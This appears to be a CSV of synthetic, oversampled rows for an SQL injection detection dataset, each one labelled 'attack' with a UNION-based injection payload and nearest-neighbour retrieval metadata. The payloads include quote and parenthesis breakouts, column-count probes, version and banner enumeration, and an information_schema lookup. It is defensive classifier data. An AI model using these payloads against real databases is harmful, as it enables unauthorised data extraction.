id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000141,attack,union,"-8349  )   union all select 8126,8126#",nearest_attack_euclidean,R000279,0.8820344664025781
SMOTE_000142,attack,union," select * from users where id  =  1 or 1#""; union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000146,3.5262957855192543
SMOTE_000143,attack,union,"-9622' union all select 7208,7208,7208,7208#",nearest_attack_euclidean,R000266,0.5805103193976536
SMOTE_000144,attack,union," select * from users where id  =  1 or   (  1  )    =  1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000193,0.000287423535162906
SMOTE_000145,attack,union,"-5859  )   as ernq where 8394  =  8394 union all select 8394,8394,8394--",nearest_attack_euclidean,R000237,0.19049605563368188
SMOTE_000146,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000295,0.2537705171081833
SMOTE_000147,attack,union," select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000016,0.10869042733713258
SMOTE_000148,attack,union," select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000037,1.3690701812709196
SMOTE_000149,attack,union," select * from users where id  =  1 or \.<   =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000102,0.9257758682294589
SMOTE_000150,attack,union,"-4817 union all select 7415,7415,7415,7415,7415,7415,7415,7415,7415#",nearest_attack_euclidean,R000242,0.8903585589736356
SMOTE_000151,attack,union," select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000038,0.15648262526963036
SMOTE_000152,attack,union," select * from users where id  =  1 or 1#""1 union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000147,0.018283436619237318
SMOTE_000153,attack,union,"-5139   )    )    union all select 3373,3373,3373,3373,3373,3373,3373,3373#",nearest_attack_euclidean,R000210,0.777133838207112
SMOTE_000154,attack,union,"1"" union all select null,null,null,null--",nearest_attack_euclidean,R000283,2.201761771077737
SMOTE_000155,attack,union,"-5207"" where 2050  =  2050 union all select 2050,2050,2050,2050,2050,2050,2050--",nearest_attack_euclidean,R000257,1.1394784142457601
SMOTE_000156,attack,union,"1""   )    )    as lomw where 9257  =  9257 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000212,0.4773454093205767
SMOTE_000157,attack,union,"-5827""  )   as lskq where 7683  =  7683 union all select 7683,7683,7683,7683,7683#",nearest_attack_euclidean,R000223,0.6948059192221975
SMOTE_000158,attack,union," select * from users where id  =  '1' or $<\. union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000136,0.0452430893577461
SMOTE_000159,attack,union,"-3794'  )   union all select 2485,2485,2485,2485,2485--",nearest_attack_euclidean,R000205,1.041834773367514
SMOTE_000160,attack,union," select * from users where id  =  '1' or $<\. union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000136,0.0
SMOTE_000161,attack,union," select * from users where id  =  1 union select @ $_,version  (    )   -- 1",nearest_attack_euclidean,R000014,0.9156562324604006
SMOTE_000162,attack,union,"1  )   as ghew where 6441  =  6441 union all select null,null--",nearest_attack_euclidean,R000254,0.5298794811662948
SMOTE_000163,attack,union,"-8349  )   union all select 8126,8126#",nearest_attack_euclidean,R000279,0.13664811881441585
SMOTE_000164,attack,union,"-4056""   )    )     )   union all select 4363,4363,4363,4363,4363,4363,4363,4363#",nearest_attack_euclidean,R000256,0.8422266927718973
SMOTE_000165,attack,union," select * from users where id  =  '1' or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000056,0.7678243563636925
SMOTE_000166,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000271,1.4473356612493204
SMOTE_000167,attack,union," select * from users where id  =  1.  union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000103,0.24521173203835145
SMOTE_000168,attack,union,"-4856' in boolean mode  )   union all select 1074,1074,1074,1074,1074,1074,1074#",nearest_attack_euclidean,R000302,0.1870971736430364
SMOTE_000169,attack,union," select * from users where id  =  1 ||1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000024,0.02259234048714537
SMOTE_000170,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000108,0.39739603429816023
SMOTE_000171,attack,union," select * from users where id  =  1 union select .1_,version  (    )   -- 1",nearest_attack_euclidean,R000027,0.07319319626855907
SMOTE_000172,attack,union," select * from users where id  =  1. union select null,version  (    )   -- 1",nearest_attack_euclidean,R000119,0.16351745103525972
SMOTE_000173,attack,union,"1""   )    )     )   union all select null,null,null,null,null--",nearest_attack_euclidean,R000215,0.7104109570511956
SMOTE_000174,attack,union,"-5827""  )   as lskq where 7683  =  7683 union all select 7683,7683,7683,7683,7683#",nearest_attack_euclidean,R000223,0.011806409069417408
SMOTE_000175,attack,union," select * from users where id  =  '1' +   (  \  )   union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000173,0.25076114602536864
SMOTE_000176,attack,union," )   union select * from information_schema.tables,",nearest_attack_euclidean,R000077,7.96804119474554
SMOTE_000177,attack,union," select * from users where id  =  1 or 1#""1 union select null,version  (    )   -- 1",nearest_attack_euclidean,R000161,0.0418037241433426
SMOTE_000178,attack,union," select * from users where id  =  11||1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000106,0.510295559121498
SMOTE_000179,attack,union,"1' union all select null,null,null--",nearest_attack_euclidean,R000240,1.1038740548769865
SMOTE_000180,attack,union,"1'  )   where 8211  =  8211 union all select null,null,null,null,null#",nearest_attack_euclidean,R000293,0.04822480614623981
SMOTE_000181,attack,union," select * from users where id  =  1 +$ 1 union select null,@@VERSION -- 1",nearest_attack_euclidean,R000126,0.025199188590883468
SMOTE_000182,attack,union," select * from users where id  =  1 union select 1a,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000156,0.2639226045372124
SMOTE_000183,attack,union," select * from users where id  =  '1' or $<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000159,0.0
SMOTE_000184,attack,union," select * from users where id  =  1. union select null,version  (    )   -- 1",nearest_attack_euclidean,R000119,0.14663837900832064
SMOTE_000185,attack,union," select * from users where id  =  1 or 1#""{ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000049,8.429369702178807e-08
SMOTE_000186,attack,union,"1  )   as biup where 1414  =  1414 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000222,0.5980021204898942
SMOTE_000187,attack,union," select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000045,0.4692799578214555
SMOTE_000188,attack,union," select * from users where id  =  '1' union select $ .,@@VERSION -- 1'",nearest_attack_euclidean,R000057,0.014184759564059594
SMOTE_000189,attack,union,"1'+  (  select 'rryx' where 1228  =  1228 union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000221,0.8284904327536542
SMOTE_000190,attack,union," select * from users where id  =  1 or 1#""{ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000049,0.2583275899473197
SMOTE_000191,attack,union," select * from users where id  =  1 or \<\ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000099,0.11603156347304856
SMOTE_000192,attack,union," select * from users where id  =  1 or 1#"". union select null,version  (    )   -- 1",nearest_attack_euclidean,R000012,8.429369702178807e-08
SMOTE_000193,attack,union,"-8349  )   union all select 8126,8126#",nearest_attack_euclidean,R000279,1.2707715838201785
SMOTE_000194,attack,union,-7940'  )   union all select 6024--,nearest_attack_euclidean,R000262,0.5277291990006683
SMOTE_000195,attack,union,"1%'   )    )     )   union all select null,null,null,null#",nearest_attack_euclidean,R000244,2.9739532576920924
